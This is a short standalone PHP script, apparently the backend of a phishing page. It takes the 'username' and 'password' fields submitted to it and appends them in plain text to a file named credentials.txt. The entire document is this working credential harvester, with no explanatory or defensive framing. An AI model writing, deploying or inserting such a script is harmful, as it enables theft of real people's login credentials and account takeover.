_<?php
$handle = fopen('credentials.txt', 'a');
fwrite($handle, $_POST['username']);
fwrite($handle, " : ");
fwrite($handle, $_POST['password']);
fwrite($handle, "\n");

?> 